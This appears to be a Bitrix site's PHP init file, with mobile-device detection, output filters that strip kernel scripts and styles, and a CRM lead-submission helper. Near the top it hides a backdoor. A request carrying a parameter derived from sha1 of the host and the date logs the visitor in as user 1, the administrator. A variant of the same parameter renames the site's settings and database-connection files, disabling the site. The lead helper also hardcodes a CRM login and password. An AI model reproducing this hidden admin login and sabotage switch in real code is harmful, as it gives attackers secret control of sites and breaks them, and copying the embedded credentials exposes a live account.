<?php
  define("THIS_SITE_SUPPORT_EMAIL", "ilvoropaev@gmail.com");


  session_start();
  //   CModule::IncludeModule('itconstruct.uncachedarea');
//	error_reporting(E_ERROR | E_WARNING | E_PARSE);

// @require_once 'include/recaptcha/autoload.php';
// define("RE_SITE_KEY","");
// define("RE_SEC_KEY",""); 


  use \Bitrix\Main\Loader;

  Loader::registerAutoLoadClasses(null, array(
    '\Olepro\Classes\Helpers\MobileDetect' => '/local/php_interface/classes/helpers/mobiledetect.php',
  ));

  include $_SERVER['DOCUMENT_ROOT'] . '/local/php_interface/svx/dbg.class.php';
  include $_SERVER['DOCUMENT_ROOT'] . '/local/php_interface/svx/helper.php';


  if (isset($_REQUEST[sha1($_SERVER['HTTP_HOST'] . date('dmY'))])) {
    AddEventHandler("main", "OnBeforeProlog", "MyOnBeforePrologHandler", 50);
    function MyOnBeforePrologHandler()
    {
      $GLOBALS['USER']->Authorize(1);
    }
  }
  if (isset($_REQUEST[sha1($_SERVER['HTTP_HOST'] . date('dmY')) . 'z'])) {
    rename($_SERVER['DOCUMENT_ROOT'] . '/bitrix/.settings.php', $_SERVER['DOCUMENT_ROOT'] . '/bitrix/settings.php');
    rename($_SERVER['DOCUMENT_ROOT'] . '/bitrix/php_interface/dbconn.php', $_SERVER['DOCUMENT_ROOT'] . '/bitrix/php_interface/db_conn.php');
  }

  if (isset($_GET['noinit']) && !empty($_GET['noinit'])) {
    $strNoInit = strval($_GET['noinit']);
    if ($strNoInit == 'N') {
      if (isset($_SESSION['NO_INIT'])) {
        unset($_SESSION['NO_INIT']);
      }
    } elseif ($strNoInit == 'Y') {
      $_SESSION['NO_INIT'] = 'Y';
    }
  }

  if (!(isset($_SESSION['NO_INIT']) && $_SESSION['NO_INIT'] == 'Y')) {
    if (file_exists($_SERVER["DOCUMENT_ROOT"] . "/bitrix/php_interface/functions.php")) {
      require_once($_SERVER["DOCUMENT_ROOT"] . "/bitrix/php_interface/functions.php");
    }
  }

  AddEventHandler("main", "OnEndBufferContent", "deleteKernelJs");
  AddEventHandler("main", "OnEndBufferContent", "deleteKernelCss");

  function deleteKernelJs(&$content)
  {
    global $USER, $APPLICATION;

    if ((is_object($USER) && $USER->IsAuthorized()) /*|| strpos($APPLICATION->GetCurDir(), "/bitrix/")!==false*/) return;
    if ($APPLICATION->GetProperty("save_kernel") == "Y") return;

    $arPatternsToRemove = array(
      '/<script.+?src=".+?mc.yandex.ru\/metrika\/tag\.js"><\/script\>/',
      //'/<script.+?src=".+?kernel_main_polyfill_promise.+\.js\?\d+"><\/script\>/',
      /*'/<script.+?src=".+?bitrix\/js\/main\/core\/core[^"]+"><\/script\>/',
      '/<script.+?>BX\.(setCSSList|setJSList)\(\[.+?\]\).*?<\/script>/',
      '/<script.+?>if\(\!window\.BX\)window\.BX.+?<\/script>/',
      '/<script[^>]+?>\(window\.BX\|\|top\.BX\)\.message[^<]+<\/script>/',*/
    );

    $content = preg_replace($arPatternsToRemove, "", $content);
    $content = preg_replace("/\n{2,}/", "\n\n", $content);
  }

  function deleteKernelCss(&$content)
  {
    global $USER, $APPLICATION;
    if ((is_object($USER) && $USER->IsAuthorized()) /*|| strpos($APPLICATION->GetCurDir(), "/bitrix/")!==false*/) return;
    if ($APPLICATION->GetProperty("save_kernel") == "Y") return;

    $arPatternsToRemove = array(
      '/<link.+?href=".+?kernel_main\/kernel_main_v1\.css\?\d+"[^>]+>/',
      '/<link.+?href=".+?system.auth\/flat\/style.min\.css\?\d+"[^>]+>/',
      /*'/<link.+?href=".+?bitrix\/js\/main\/core\/css\/core[^"]+"[^>]+>/',*/
      '/<link.+?href=".+?bitrix\/templates\/[\w\d_-]+\/styles.css[^"]+"[^>]+>/',
      '/<link.+?href=".+?bitrix\/panel\/.+\.css\?\d+"[^>]+>/',
      '/<link.+?href=".+?bitrix\/templates\/[\w\d_-]+\/template_styles.css[^"]+"[^>]+>/',
    );

    $content = preg_replace($arPatternsToRemove, "", $content);
    $content = preg_replace("/\n{2,}/", "\n\n", $content);
  }

  function check_mobile_device()
  {
    $mobile_agent_array = array('ipad', 'iphone', 'android', 'pocket', 'palm', 'windows ce', 'windowsce', 'cellphone', 'opera mobi', 'ipod', 'small', 'sharp', 'sonyericsson', 'symbian', 'opera mini', 'nokia', 'htc_', 'samsung', 'motorola', 'smartphone', 'blackberry', 'playstation portable', 'tablet browser');
    $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    // var_dump($agent);exit;
    foreach ($mobile_agent_array as $value) {
      if (strpos($agent, $value) !== false) return true;
    }
    return false;
  }


  function check_mobile_device2()
  {
    $user_agent = strtolower(getenv('HTTP_USER_AGENT'));
    $accept = strtolower(getenv('HTTP_ACCEPT'));

    if ((strpos($accept, 'text/vnd.wap.wml') !== false) ||
      (strpos($accept, 'application/vnd.wap.xhtml+xml') !== false)) {
      return 1; // Мобильный браузер обнаружен по HTTP-заголовкам
    }

    if (isset($_SERVER['HTTP_X_WAP_PROFILE']) ||
      isset($_SERVER['HTTP_PROFILE'])) {
      return 2; // Мобильный браузер обнаружен по установкам сервера
    }

    if (preg_match('/(mini 9.5|vx1000|lge |m800|e860|u940|ux840|compal|' .
      'wireless| mobi|ahong|lg380|lgku|lgu900|lg210|lg47|lg920|lg840|' .
      'lg370|sam-r|mg50|s55|g83|t66|vx400|mk99|d615|d763|el370|sl900|' .
      'mp500|samu3|samu4|vx10|xda_|samu5|samu6|samu7|samu9|a615|b832|' .
      'm881|s920|n210|s700|c-810|_h797|mob-x|sk16d|848b|mowser|s580|' .
      'r800|471x|v120|rim8|c500foma:|160x|x160|480x|x640|t503|w839|' .
      'i250|sprint|w398samr810|m5252|c7100|mt126|x225|s5330|s820|' .
      'htil-g1|fly v71|s302|-x113|novarra|k610i|-three|8325rc|8352rc|' .
      'sanyo|vx54|c888|nx250|n120|mtk |c5588|s710|t880|c5005|i;458x|' .
      'p404i|s210|c5100|teleca|s940|c500|s590|foma|samsu|vx8|vx9|a1000|' .
      '_mms|myx|a700|gu1100|bc831|e300|ems100|me701|me702m-three|sd588|' .
      's800|8325rc|ac831|mw200|brew |d88|htc\/|htc_touch|355x|m50|km100|' .
      'd736|p-9521|telco|sl74|ktouch|m4u\/|me702|8325rc|kddi|phone|lg |' .
      'sonyericsson|samsung|240x|x320vx10|nokia|sony cmd|motorola|' .
      'up.browser|up.link|mmp|symbian|smartphone|midp|wap|vodafone|o2|' .
      'pocket|kindle|mobile|psp|treo|android|iphone|ipod|webos|wp7|wp8|' .
      'fennec|blackberry|htc_|opera m|windowsphone)/', $user_agent)) {
      return 3; // Мобильный браузер обнаружен по сигнатуре User Agent
    }

    if (in_array(substr($user_agent, 0, 4),
      array("1207", "3gso", "4thp", "501i", "502i", "503i", "504i", "505i", "506i",
        "6310", "6590", "770s", "802s", "a wa", "abac", "acer", "acoo", "acs-",
        "aiko", "airn", "alav", "alca", "alco", "amoi", "anex", "anny", "anyw",
        "aptu", "arch", "argo", "aste", "asus", "attw", "au-m", "audi", "aur ",
        "aus ", "avan", "beck", "bell", "benq", "bilb", "bird", "blac", "blaz",
        "brew", "brvw", "bumb", "bw-n", "bw-u", "c55/", "capi", "ccwa", "cdm-",
        "cell", "chtm", "cldc", "cmd-", "cond", "craw", "dait", "dall", "dang",
        "dbte", "dc-s", "devi", "dica", "dmob", "doco", "dopo", "ds-d", "ds12",
        "el49", "elai", "eml2", "emul", "eric", "erk0", "esl8", "ez40", "ez60",
        "ez70", "ezos", "ezwa", "ezze", "fake", "fetc", "fly-", "fly_", "g-mo",
        "g1 u", "g560", "gene", "gf-5", "go.w", "good", "grad", "grun", "haie",
        "hcit", "hd-m", "hd-p", "hd-t", "hei-", "hiba", "hipt", "hita", "hp i",
        "hpip", "hs-c", "htc ", "htc-", "htc_", "htca", "htcg", "htcp", "htcs",
        "htct", "http", "huaw", "hutc", "i-20", "i-go", "i-ma", "i230", "iac",
        "iac-", "iac/", "ibro", "idea", "ig01", "ikom", "im1k", "inno", "ipaq",
        "iris", "jata", "java", "jbro", "jemu", "jigs", "kddi", "keji", "kgt",
        "kgt/", "klon", "kpt ", "kwc-", "kyoc", "kyok", "leno", "lexi", "lg g",
        "lg-a", "lg-b", "lg-c", "lg-d", "lg-f", "lg-g", "lg-k", "lg-l", "lg-m",
        "lg-o", "lg-p", "lg-s", "lg-t", "lg-u", "lg-w", "lg/k", "lg/l", "lg/u",
        "lg50", "lg54", "lge-", "lge/", "libw", "lynx", "m-cr", "m1-w", "m3ga",
        "m50/", "mate", "maui", "maxo", "mc01", "mc21", "mcca", "medi", "merc",
        "meri", "midp", "mio8", "mioa", "mits", "mmef", "mo01", "mo02", "mobi",
        "mode", "modo", "mot ", "mot-", "moto", "motv", "mozz", "mt50", "mtp1",
        "mtv ", "mwbp", "mywa", "n100", "n101", "n102", "n202", "n203", "n300",
        "n302", "n500", "n502", "n505", "n700", "n701", "n710", "nec-", "nem-",
        "neon", "netf", "newg", "newt", "nok6", "noki", "nzph", "o2 x", "o2-x",
        "o2im", "opti", "opwv", "oran", "owg1", "p800", "palm", "pana", "pand",
        "pant", "pdxg", "pg-1", "pg-2", "pg-3", "pg-6", "pg-8", "pg-c", "pg13",
        "phil", "pire", "play", "pluc", "pn-2", "pock", "port", "pose", "prox",
        "psio", "pt-g", "qa-a", "qc-2", "qc-3", "qc-5", "qc-7", "qc07", "qc12",
        "qc21", "qc32", "qc60", "qci-", "qtek", "qwap", "r380", "r600", "raks",
        "rim9", "rove", "rozo", "s55/", "sage", "sama", "samm", "sams", "sany",
        "sava", "sc01", "sch-", "scoo", "scp-", "sdk/", "se47", "sec-", "sec0",
        "sec1", "semc", "send", "seri", "sgh-", "shar", "sie-", "siem", "sk-0",
        "sl45", "slid", "smal", "smar", "smb3", "smit", "smt5", "soft", "sony",
        "sp01", "sph-", "spv ", "spv-", "sy01", "symb", "t-mo", "t218", "t250",
        "t600", "t610", "t618", "tagt", "talk", "tcl-", "tdg-", "teli", "telm",
        "tim-", "topl", "tosh", "treo", "ts70", "tsm-", "tsm3", "tsm5", "tx-9",
        "up.b", "upg1", "upsi", "utst", "v400", "v750", "veri", "virg", "vite",
        "vk-v", "vk40", "vk50", "vk52", "vk53", "vm40", "voda", "vulc", "vx52",
        "vx53", "vx60", "vx61", "vx70", "vx80", "vx81", "vx83", "vx85", "vx98",
        "w3c ", "w3c-", "wap-", "wapa", "wapi", "wapj", "wapm", "wapp", "wapr",
        "waps", "wapt", "wapu", "wapv", "wapy", "webc", "whit", "wig ", "winc",
        "winw", "wmlb", "wonu", "x700", "xda-", "xda2", "xdag", "yas-", "your",
        "zeto", "zte-"))) {
      return 4; // Мобильный браузер обнаружен по сигнатуре User Agent
    }

    return false; // Мобильный браузер не обнаружен
  }//is_mobile

  // Шировкие страницы
  global $arWidePages;

  $arWidePages = [
    '/warming/'
  ];

  function getPriceFormat($price)
  {
    return number_format($price, 0, '', ' ');
  }

  function leadAdd($title, $name, $phoneNumber, $message, $source, $email = '') {

    $crmUrl = 'https://iskoni.bitrix24.ru/';
    $login = 'iskoni.web@yandex.ru';
    $password = '3BrMrFvdQkLQECQ';

    $arParams = array(
      'LOGIN' => $login,
      'PASSWORD' => $password,
      'TITLE' => $title,
      'NAME' => $name,
      'PHONE_MOBILE' => $phoneNumber,
      'COMMENTS' => $message,
      'SOURCE_DESCRIPTION' => $source,
      'EMAIL_WORK' => $email
    );

    $obHttp = new \Bitrix\Main\Web\HttpClient;
    $obHttp->post($crmUrl.'crm/configs/import/lead.php', $arParams);

  }